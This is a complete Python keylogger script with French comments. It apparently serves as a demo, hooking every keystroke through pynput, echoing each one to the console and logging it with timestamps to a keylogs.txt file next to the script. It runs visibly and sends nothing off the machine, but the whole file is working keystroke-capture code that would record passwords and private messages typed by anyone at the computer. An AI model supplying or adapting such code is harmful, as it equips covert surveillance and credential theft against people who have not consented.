import logging
import os
import sys
from pynput import keyboard
import time

# --- CONFIGURATION ---
# On récupère le chemin du dossier où se trouve ce script
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(CURRENT_DIR, "keylogs.txt")

print(f"--- DEMARRAGE DU KEYLOGGER WINDOWS ---")
print(f"[INFO] Le fichier de log sera ici : {LOG_FILE}")
print(f"[INFO] Ecoute en cours... (Fermez cette fenetre pour arreter)")

# Configuration du logging : 
# 1. Ecriture dans le fichier
# 2. Affichage dans la console (pour la démo)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s: %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout) 
    ]
)

def on_press(key):
    try:
        k = str(key).replace("'", "")
        
        # Nettoyage pour la lisibilité
        if key == keyboard.Key.space:
            k = " [ESPACE] "
        elif key == keyboard.Key.enter:
            k = " [ENTREE]\n"
        elif key == keyboard.Key.backspace:
            k = " [EFFACER] "
        
        # 1. Affiche dans la console noire (Preuve visuelle)
        print(f"Capture > {k}")
        
        # 2. Ecrit dans le fichier
        logging.info(k)
        
    except Exception as e:
        print(f"Erreur: {e}")

# Lancement du Hook Windows
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Arret du keylogger.")
